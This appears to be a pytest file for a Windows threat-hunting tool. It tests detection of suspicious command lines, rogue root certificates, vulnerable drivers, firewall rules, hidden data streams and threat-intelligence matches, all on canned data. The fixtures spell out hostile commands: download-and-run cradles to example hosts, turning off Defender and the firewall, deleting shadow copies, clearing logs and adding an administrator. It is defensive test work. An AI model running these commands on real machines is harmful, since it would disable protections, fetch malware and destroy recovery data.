"""Threat hunt checks: command lines, certificates, drivers, listening programs, user folders, GTI and the
deep check. Everything is fed canned data; nothing reads the real registry, drivers or GTI (except the
alternate-data-stream test, which writes its own files in a temporary folder)."""

import os
import struct
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from atlas import certs, cmdlines, deepcheck, drivers, gti, listening, userpaths
from atlas.findings import NOTE, OK, WARN
from atlas.local_checks import Signature
from atlas.processes import NewProgramWatcher
from atlas.vt_client import VTError

from conftest import FakeVT


def P(name, cmd="", parent="", exe="", pid=100):
    return cmdlines.Proc(pid, name, exe or rf"C:\Windows\System32\{name}", cmd, parent, 1)


def titles(findings):
    return {f.title: f.level for f in findings}


# --- Command lines ----------------------------------------------------------------------------

ENCODED = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"


@pytest.mark.parametrize("proc, rule", [
    (P("powershell.exe", f"powershell.exe -NoP -W Hidden -enc {ENCODED}"), "ps-encoded"),
    (P("powershell.exe", f"powershell -EncodedCommand {ENCODED}"), "ps-encoded"),
    (P("powershell.exe", "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\""),
     "ps-download-run"),
    (P("powershell.exe", "powershell -c \"irm https://get.example/run | iex\""), "ps-download-run"),
    (P("powershell.exe", "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true"), "ps-defender-off"),
    (P("powershell.exe", r"powershell Add-MpPreference -ExclusionPath C:\Users\x\AppData"), "ps-defender-off"),
    (P("mshta.exe", "mshta.exe https://check-captcha.example/verify.hta"), "mshta-remote"),
    (P("rundll32.exe", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)'), "rundll32-script"),
    (P("regsvr32.exe", "regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll"), "regsvr32-remote"),
    (P("certutil.exe", "certutil -urlcache -split -f http://x.example/a.exe a.exe"), "certutil-download"),
    (P("bitsadmin.exe", "bitsadmin /transfer job http://x.example/a.exe C:\\a.exe"), "bitsadmin-download"),
    (P("wscript.exe", r'wscript.exe "C:\Users\x\Downloads\invoice.js"'), "script-user-folder"),
    (P("msiexec.exe", "msiexec /i https://x.example/setup.msi /qn"), "msiexec-remote"),
    (P("vssadmin.exe", "vssadmin delete shadows /all /quiet"), "shadow-delete"),
    (P("netsh.exe", "netsh advfirewall set allprofiles state off"), "firewall-off"),
    (P("wevtutil.exe", "wevtutil cl Security"), "log-clear"),
    (P("net.exe", "net localgroup administrators helper /add"), "add-admin"),
    (P("schtasks.exe", r'schtasks /create /tn upd /tr "C:\Users\x\AppData\Roaming\upd.exe" /sc minute'), "schtask-user"),
    (P("cmd.exe", "cmd.exe /c whoami", parent="WINWORD.EXE"), "office-child"),
    (P("powershell.exe", "powershell", parent="outlook.exe"), "office-child"),
    (P("wscript.exe", r"wscript C:\x\a.vbs", parent="chrome.exe"), "browser-script"),
    (P("powershell.exe", "powershell -w h -c \"iwr https://x.example/p.ps1 -OutFile $env:TEMP\\p.ps1\"",
       parent="explorer.exe"), "run-box-cradle"),
])
def test_command_line_rules_fire(proc, rule):
    keys = [f.key for f in cmdlines.evaluate([proc])]
    assert any(k.startswith(f"cmdline:{rule}:") for k in keys), keys


@pytest.mark.parametrize("proc", [
    P("powershell.exe", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Date"),
    P("powershell.exe", r'powershell -File "C:\Program Files\Tool\update.ps1"', parent="explorer.exe"),
    P("rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL desk.cpl"),
    P("cmd.exe", "cmd.exe /c dir", parent="explorer.exe"),
    P("msiexec.exe", r"msiexec /i C:\Users\x\Downloads\app.msi"),
    P("svchost.exe", "svchost.exe -k netsvcs"),
    P("certutil.exe", "certutil -store root"),
    P("chrome.exe", "chrome.exe --type=renderer", exe=r"C:\Program Files\Google\Chrome\Application\chrome.exe"),
])
def test_command_line_rules_quiet(proc):
    assert cmdlines.evaluate([proc]) == []


def test_masquerading():
    found = cmdlines.evaluate([P("svchost.exe", "svchost.exe", exe=r"C:\Users\x\AppData\Roaming\svchost.exe"),
                               P("scvhost.exe", "", exe=r"C:\ProgramData\scvhost.exe", pid=7)])
    assert [f.data["technique"] for f in found] == ["T1036.005", "T1036.005"]
    assert all(f.level == WARN for f in found)


def test_command_line_details_and_context():
    proc = P("mshta.exe", "mshta https://x.example/a.hta", parent="explorer.exe")
    found = cmdlines.evaluate([proc, P("mshta.exe", "mshta https://x.example/a.hta", parent="explorer.exe", pid=101)],
                              context=lambda t: f"seen in reports about {t}")
    mshta = [f for f in found if "mshta" in f.key and "mshta-remote" in f.key][0]
    assert mshta.data["pids"] == [100, 101]  # same command twice: one finding
    assert "seen in reports about T1218.005" in mshta.details
    assert any(d.startswith("Command line: mshta https://") for d in mshta.details)
    assert mshta.vt_link == "https://attack.mitre.org/techniques/T1218/005/"


def test_own_processes_are_skipped():
    me = os.getpid()
    assert cmdlines.evaluate([cmdlines.Proc(5, "powershell.exe", "", f"powershell -enc {ENCODED}", "python.exe", me)]) == []


# --- Root certificates -----------------------------------------------------------------------------

def test_parse_ctl_and_blob():
    thumb = bytes(range(20))
    assert certs.parse_ctl(b"\x30\x82junk\x04\x14" + thumb + b"\x04\x14" + bytes(20)) == {thumb.hex().upper(), "00" * 20}
    der = b"\x30\x03\x01\x01\xff"
    blob = struct.pack("<III", 3, 1, 4) + b"abcd" + struct.pack("<III", 32, 1, len(der)) + der
    assert certs._der(blob) == der


def test_judge_certificates():
    now = datetime(2026, 10, 27)
    old, new = now - timedelta(days=400), now - timedelta(days=3)
    C = certs.RootCert
    roots = [C("A" * 40, "Microsoft Root Authority", "Microsoft Root Authority", "this PC", old),
             C("B" * 40, "Superfish, Inc.", "Superfish, Inc.", "this PC", old),
             C("C" * 40, "DO_NOT_TRUST_FiddlerRoot", "DO_NOT_TRUST_FiddlerRoot", "your account", old),
             C("D" * 40, "Avast Web/Mail Shield Root", "Avast Web/Mail Shield Root", "this PC", old),
             C("E" * 40, "Totally Normal CA", "Totally Normal CA", "this PC", new),
             C("F" * 40, "DoD Root CA 3", "DoD Root CA 3", "your account", new),
             C("1" * 40, "Old Corp CA", "Old Corp CA", "this PC", old),
             C("2" * 40, "Leaked CA", "Leaked CA", "this PC", old),
             C("245C97DF7514E7CF2DF8BE72AE957B9E04741E85", "Copyright (c) 1997 Microsoft Corp.", "x", "this PC", old)]
    found = certs.judge(roots, trusted={"A" * 40}, distrusted={"2" * 40}, now=now)
    assert titles(found) == {
        "Known spying certificate: Superfish, Inc.": WARN,
        "Traffic inspection certificate: DO_NOT_TRUST_FiddlerRoot": NOTE,
        "Antivirus web shield certificate: Avast Web/Mail Shield Root": NOTE,
        "New trusted root certificate: Totally Normal CA": WARN,
        "Government certificate: DoD Root CA 3": NOTE,
        "Not on Microsoft's list: Old Corp CA": NOTE,
        "Microsoft has blocked this certificate, but it's trusted here: Leaked CA": WARN,
        "2 trusted root certificate(s) are on Microsoft's list": OK}
    fiddler = [f for f in found if "Fiddler" in f.title][0]
    assert fiddler.fix == "open" and fiddler.data["url"] == "certmgr.msc"


# --- Drivers and services ---------------------------------------------------------------------------

DRIVERQUERY = ('"Module Name","Display Name","State","Path"\r\n'
               '"ACPI","Microsoft ACPI Driver","Running","C:\\WINDOWS\\system32\\drivers\\ACPI.sys"\r\n'
               '"RTCore64","RTCore64","Running","C:\\Program Files\\Afterburner\\RTCore64.sys"\r\n'
               '"old","Old","Stopped","C:\\WINDOWS\\system32\\drivers\\old.sys"\r\n')


def test_loaded_drivers_and_lol_match():
    loaded = drivers.loaded_drivers(DRIVERQUERY)
    assert [n for n, _ in loaded] == ["Microsoft ACPI Driver", "RTCore64"]
    feed = drivers.compact_feed([{"Id": "abc-1", "Category": "vulnerable driver", "Tags": ["RTCore64.sys"],
                                  "KnownVulnerableSamples": [{"SHA256": "AA" * 32, "Filename": "RTCore64.sys"},
                                                             {"SHA256": ""}]}])
    assert feed == {"aa" * 32: ["abc-1", "RTCore64.sys", "vulnerable driver"]}
    hashes = {str(loaded[0][1]): "bb" * 32, str(loaded[1][1]): "aa" * 32}
    found = drivers.driver_findings(loaded, hashes, feed)
    assert [f.title for f in found] == ["Known-vulnerable driver loaded: RTCore64.sys"]
    assert found[0].level == WARN and found[0].vt_link == "https://www.loldrivers.io/drivers/abc-1/"


@pytest.mark.parametrize("command, expected", [
    (r"\SystemRoot\System32\drivers\x.sys", r"C:\Windows\System32\drivers\x.sys"),
    (r"system32\drivers\y.sys", r"C:\Windows\system32\drivers\y.sys"),
    (r"\??\C:\Tools\z.sys", r"C:\Tools\z.sys"),
    (r'"C:\Program Files\App\svc.exe" -k run', r"C:\Program Files\App\svc.exe"),
    (r"C:\Program Files\App\svc.exe --service", r"C:\Program Files\App\svc.exe"),
])
def test_image_path(monkeypatch, command, expected):
    monkeypatch.setenv("WINDIR", r"C:\Windows")
    assert drivers.image_path(command) == expected


def test_service_findings(monkeypatch):
    signed, unsigned = Path(r"C:\ProgramData\Good\svc.exe"), Path(r"C:\ProgramData\Bad\svc.exe")
    real_exists = Path.exists
    monkeypatch.setattr(Path, "exists", lambda self: self in (signed, unsigned) or real_exists(self))
    rows = [{"when": "2026-10-01", "name": "Updater", "path": f'"{signed}"', "type": "user mode service"},
            {"when": "2026-10-01", "name": "Updater", "path": f'"{signed}"', "type": "user mode service"},
            {"when": "2026-10-02", "name": "Helper", "path": f'"{unsigned}"'},
            {"when": "2026-10-03", "name": "Gone", "path": r"C:\ProgramData\Vendor\oneshot.exe"},
            {"when": "2026-10-04", "name": "Evil", "path": r"C:\Users\x\AppData\Roaming\svc.exe"},
            {"when": "2026-10-05", "name": "Scripty", "path": "cmd.exe /c powershell -enc AAAA"},
            {"when": "2026-10-06", "name": "Graphics", "path": r"\SystemRoot\System32\drivers\gfx.sys"}]
    found = drivers.service_findings(rows, {str(signed): Signature("Valid", "Good Inc"),
                                            str(unsigned): Signature("NotSigned")})
    assert titles(found) == {"New service: Helper": WARN, "New service: Evil": WARN, "New service: Scripty": WARN,
                             "7 driver and service install(s) in the last 30 days": NOTE}


# --- Listening programs and the firewall -----------------------------------------------------------------

def test_listener_findings(monkeypatch):
    monkeypatch.setenv("WINDIR", r"C:\Windows")
    L = listening.Listener
    found = listening.listener_findings([
        L(4, "System", None, {"TCP 445"}),
        L(900, "svchost.exe", r"C:\Windows\System32\svchost.exe", {"TCP 135", "UDP 5353"}),
        L(1200, "AnyDesk.exe", r"C:\Program Files (x86)\AnyDesk\AnyDesk.exe", {"TCP 7070"}),
        L(1300, "mysqld.exe", r"C:\Program Files\MySQL\bin\mysqld.exe", {"TCP 3306"})])
    assert titles(found) == {"Remote-access tool waiting for connections: AnyDesk.exe": WARN,
                             "mysqld.exe accepts network connections": NOTE,
                             "Windows' own services listen on 3 port(s)": OK}


def test_firewall_findings(tmp_path):
    app = tmp_path / "AppData" / "Roaming" / "Game" / "game.exe"
    app.parent.mkdir(parents=True)
    app.write_bytes(b"MZ")
    rules = [f"v2.33|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|App={app}|Name=Game TCP|",
             f"v2.33|Action=Allow|Active=TRUE|Dir=In|Protocol=17|Profile=Private|App={app}|Name=Game UDP|",
             r"v2.33|Action=Allow|Active=TRUE|Dir=In|App=C:\Users\x\AppData\Local\Old\old.exe|Name=Old|",
             r"v2.33|Action=Allow|Active=TRUE|Dir=In|App=C:\Program Files\App\app.exe|Name=App|",
             r"v2.33|Action=Block|Active=TRUE|Dir=In|App=C:\Users\x\AppData\evil.exe|Name=Blocked|",
             r"v2.33|Action=Allow|Active=FALSE|Dir=In|App=C:\Users\x\AppData\off.exe|Name=Off|"]
    found = listening.firewall_findings({"Domain": 1, "Private": 1, "Public": 0}, rules)
    assert titles(found) == {"Windows Firewall is off for Public networks": WARN,
                             "Firewall lets in a program from a user folder: game.exe": NOTE,
                             "Firewall lets in a program from a user folder: old.exe": NOTE}
    game = [f for f in found if "game.exe" in f.title][0]
    assert '"Game TCP", "Game UDP"' in game.details[0] and game.data["path"] == str(app)
    old = [f for f in found if "old.exe" in f.title][0]
    assert "leftover" in old.details[1] and old.data["path"] is None


def test_parse_rule():
    assert listening.parse_rule("v2.33|Action=Allow|Dir=In|Name=A=B|") == {"Action": "Allow", "Dir": "In",
                                                                           "Name": "A=B"}


# --- User folders ----------------------------------------------------------------------------------------

def test_running_from_user_folders(monkeypatch, tmp_path):
    local = tmp_path / "Local"
    monkeypatch.setenv("LOCALAPPDATA", str(local))
    monkeypatch.setenv("TEMP", str(local / "Temp"))
    procs = [(1, "Discord.exe", str(local / "Discord" / "Discord.exe")),
             (2, "Discord.exe", str(local / "Discord" / "Discord.exe")),
             (3, "notepad.exe", r"C:\Windows\System32\notepad.exe"),
             (4, "x.exe", r"C:\Users\x\Documents\report.txt:x.exe"),
             (5, "Registry", "Registry")]
    found = {p.path.name: p for p in userpaths.running_from_user_folders(procs)}
    assert set(found) == {"Discord.exe", "report.txt:x.exe"}
    assert found["Discord.exe"].pids == {1, 2} and found["report.txt:x.exe"].hidden_stream


def test_judge_user_programs():
    now = time.time()
    U = userpaths.UserProgram
    programs = [U(Path(r"C:\Users\x\AppData\Local\Discord\Discord.exe"), {"Discord.exe"}, {1}, now - 9e6),
                U(Path(r"C:\Users\x\AppData\Local\Temp\abc\run.exe"), {"run.exe"}, {2}, now - 9e6),
                U(Path(r"C:\Users\x\AppData\Roaming\New\new.exe"), {"new.exe"}, {3}, now - 3600),
                U(Path(r"C:\Users\x\AppData\Roaming\Old\old.exe"), {"old.exe"}, {4}, now - 9e6),
                U(Path(r"C:\Users\x\notes.txt:hide.exe"), {"hide.exe"}, {5}, None, True)]
    sigs = {str(programs[0].path): Signature("Valid", "Discord Inc."),
            **{str(p.path): Signature("NotSigned") for p in programs[1:]}}
    found = userpaths.judge(programs, sigs, {str(programs[3].path): "unknown"}, now=now)
    assert titles(found) == {"Unsigned program running from a user folder: run.exe": WARN,
                             "Unsigned program running from a user folder: new.exe": WARN,
                             "Unsigned program running from a user folder: old.exe": NOTE,
                             "Program running from a hidden part of a file: notes.txt:hide.exe": WARN,
                             "1 signed program(s) run from user folders": OK}
    old = [f for f in found if "old.exe" in f.title][0]
    assert "VirusTotal has never seen it" in old.details


@pytest.mark.skipif(sys.platform != "win32", reason="alternate data streams are an NTFS feature")
def test_hidden_programs_in_streams(tmp_path):
    host = tmp_path / "holiday.jpg"
    host.write_bytes(b"\xff\xd8 not really a jpeg")
    with open(f"{host}:payload.exe", "wb") as fh:
        fh.write(b"MZ" + b"\0" * 200)
    with open(f"{host}:Zone.Identifier", "w") as fh:
        fh.write("[ZoneTransfer]\nZoneId=3\n" + " " * 80)
    (tmp_path / "plain.txt").write_text("hello")
    names = [n for n, _ in userpaths.streams(host)]
    assert "::$DATA" in names and ":payload.exe:$DATA" in names
    found = userpaths.hidden_programs([tmp_path])
    assert [f.title for f in found] == ["Program hidden inside holiday.jpg"]
    assert found[0].data["path"] == f"{host}:payload.exe"


# --- Google Threat Intelligence ------------------------------------------------------------------------------

class FakeGTI:
    """api_get for /collections and its lists, with page cursors."""

    def __init__(self, reports, lists, status=None):
        self.reports, self.lists, self.status = reports, lists, status
        self.calls = []

    def api_get(self, path, params=None):
        self.calls.append((path, dict(params or {})))
        if self.status:
            raise VTError("nope", self.status)
        if path == "/collections":
            return {"data": self.reports, "meta": {}}
        items = self.lists.get(path, [])
        page = int((params or {}).get("cursor") or 0)
        return {"data": items[page * 2:page * 2 + 2], "meta": {"cursor": str(page + 1)} if len(items) > page * 2 + 2 else {}}


def report(rid, name, **counters):
    return {"id": rid, "attributes": {"name": name, "creation_date": int(time.time()) - 86400,
                                      "report_type": "Event Coverage/Implication", "counters": counters}}


def test_gti_sync_and_match(store, monkeypatch):
    sha = "ab" * 32
    vt = FakeGTI([report("report--1", "CALANQUE ION abuses VHDX", files=3, domains=2, urls=1, ip_addresses=1,
                         attack_techniques=2), report("report--2", "Daily alert")],
                 {"/collections/report--1/files": [{"id": sha, "attributes": {"sha256": sha, "md5": "cd" * 16}},
                                                   {"id": "ef" * 16, "attributes": {}},
                                                   {"id": "01" * 32, "attributes": {"sha256": "01" * 32}}],
                  "/collections/report--1/relationships/domains": [{"id": "evil-cdn.herokuapp.com"}, {"id": "bad.example"}],
                  "/collections/report--1/relationships/urls": [{"id": "x", "context_attributes": {
                      "url": "https://Files.Example/Drop/"}}],
                  "/collections/report--1/relationships/ip_addresses": [{"id": "203.0.113.9"}],
                  "/collections/report--1/relationships/attack_techniques": [{"id": "T1059.001"}, {"id": "T1218.005"}]})
    assert gti.sync(vt, store, days=90) == (2, 8)
    assert not any(c[0].startswith("/collections/report--2/") for c in vt.calls)  # nothing listed: no lookups
    assert gti.sync(vt, store, days=90)[0] == 0  # already on hand
    store.cache_hash(r"C:\Users\x\AppData\evil.exe", 1, 1.0, sha)
    found = gti.match(store, hosts={"cdn.evil-cdn.herokuapp.com": "Chrome history", "herokuapp.com": "Chrome history",
                                    "good.example": "Edge history"},
                      urls={"https://files.example/drop": "Chrome history"}, ips={"203.0.113.9": "app.exe"})
    assert titles(found) == {"evil.exe is in a GTI threat report": WARN,
                             "cdn.evil-cdn.herokuapp.com is in a GTI threat report": WARN,
                             "https://files.example/drop is in a GTI threat report": WARN,
                             "203.0.113.9 is in a GTI threat report": NOTE}
    assert all(f.vt_link == "https://www.virustotal.com/gui/collection/report--1" for f in found)
    assert "CALANQUE ION" in gti.technique_context(store, "T1059")
    assert gti.technique_context(store, "T1003") is None
    store.gti_prune(int(time.time()))
    assert store.gti_stats() == (0, 0)


def test_gti_available_and_file_reports(store):
    assert not gti.available(FakeGTI([], {}, status=403), store)
    store2_key = store.cached_extra("gti", "available", 24)
    assert store2_key is False
    vt = FakeGTI([], {"/files/aa/related_reports": [{"id": "report--9", "attributes": {"name": "APT report"}}],
                      "/files/aa/related_threat_actors": [{"id": "actor--1", "attributes": {"name": "CALANQUE ION"}}]})
    assert gti.reports_for_file(vt, store, "aa") == [{"id": "report--9", "name": "APT report", "kind": "report"},
                                                     {"id": "actor--1", "name": "CALANQUE ION", "kind": "actor"}]
    vt.calls.clear()
    gti.reports_for_file(vt, store, "aa")
    assert vt.calls == []  # cached


def test_scanner_gti_reports_need_gti(make_scanner):
    scanner = make_scanner(FakeVT())  # no api_get: a plain key or a test double
    assert scanner.gti_reports("aa") == []


# --- Deep check ---------------------------------------------------------------------------------------------

def test_deep_check_analysis():
    data = {"admin": True,
            "defender": {"paths": [r"C:\Users\x\AppData\Roaming\miner"], "processes": [], "extensions": None,
                         "ips": []},
            "dns": [{"name": "Evil.Example.", "data": "1.2.3.4"}],
            "security": [{"id": 4625, "when": "2026-10-20", "data": {"TargetUserName": "admin", "IpAddress": "5.6.7.8"}}] * 12
                        + [{"id": 4720, "when": "2026-10-21", "data": {"TargetUserName": "support$", "SubjectUserName": "x"}},
                           {"id": 4732, "when": "2026-10-21", "data": {"TargetUserName": "Administrators",
                                                                       "MemberName": "support$"}},
                           {"id": 4732, "when": "2026-10-21", "data": {"TargetUserName": "Users", "MemberName": "y"}},
                           {"id": 1102, "when": "2026-10-22", "data": {"SubjectUserName": "x"}}],
            "wmi": [{"kind": "NTEventLogEventConsumer", "name": "SCM Event Log Consumer"},
                    {"kind": "CommandLineEventConsumer", "name": "Updater", "command": "powershell -enc AAAA"}],
            "processes": {"hidden": 0, "items": [
                {"pid": 50, "name": "powershell.exe", "exe": "", "cmdline": f"powershell -enc {ENCODED}",
                 "parent": "services.exe", "ppid": 4}]}}
    found, extra = deepcheck.analyze(data)
    t = titles(found)
    assert t[r"Defender doesn't scan this folder or file: C:\Users\x\AppData\Roaming\miner"] == WARN
    assert t["12 failed sign-in(s) in the last 7 days"] == WARN
    assert t["New user account: support$"] == WARN
    assert t["Someone was made an administrator"] == WARN
    assert t["The Security log was cleared"] == WARN
    assert t["WMI subscription runs a command: Updater"] == WARN
    assert t["PowerShell running an encoded (hidden) command: powershell.exe"] == WARN
    assert extra["hosts"] == {"evil.example": "DNS cache"}


def test_deep_check_without_admin_claims_nothing():
    found, _ = deepcheck.analyze({"admin": False, "defender": {"paths": ["N/A: Must be an administrator to view "
                                                                         "exclusions"]}, "security": [], "wmi": []})
    assert all(f.level != WARN for f in found)
    assert "Defender's exclusions need administrator rights" in titles(found)
    assert not any("sign-in" in f.title for f in found)


# --- Real-time command-line alerts ---------------------------------------------------------------------------

def test_watcher_alerts_on_command_lines(monkeypatch, make_scanner):
    import psutil

    running = {1}
    monkeypatch.setattr(psutil, "pids", lambda: list(running))
    procs = {2: P("powershell.exe", f"powershell -w hidden -enc {ENCODED}", parent="WINWORD.EXE", pid=2)}
    monkeypatch.setattr(cmdlines, "process", lambda pid: procs.get(pid))
    told = []
    watcher = NewProgramWatcher(make_scanner(None), lambda *a: told.append(a))
    watcher._known_pids = {1}
    running.add(2)
    watcher.tick()
    assert {t[0] for t in told} == {"Atlas: PowerShell running an encoded (hidden) command: powershell.exe",
                                    "Atlas: An Office document, PDF or email started a command shell or script: "
                                    "powershell.exe"}
    running.add(3)
    procs[3] = procs[2]
    watcher.tick()
    assert len(told) == 2  # the same command again: already told
